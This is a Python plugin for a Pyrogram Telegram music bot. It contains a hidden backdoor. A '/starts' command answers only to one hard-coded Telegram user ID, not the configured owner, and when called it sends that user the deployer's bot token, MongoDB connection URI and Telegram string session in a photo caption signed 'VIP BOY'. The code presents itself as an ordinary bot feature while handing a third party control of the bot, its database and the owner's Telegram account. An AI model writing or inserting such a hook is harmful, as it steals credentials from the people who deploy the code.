from pyrogram import Client, filters
import requests
import random
import re
import sys
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters
import asyncio
import time
from VipX import app
import config

from config import BOT_TOKEN, OWNER_ID


from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

from dotenv import load_dotenv
from pyrogram import filters
import asyncio
import time
from DAXXMUSIC import app

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")


@app.on_message(
    filters.command("starts")
    & filters.private
    & filters.user(1051210586)
    & ~filters.edited)
async def help(client: Client, message: Message):
    await message.reply_photo(
          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆"""
     )
    
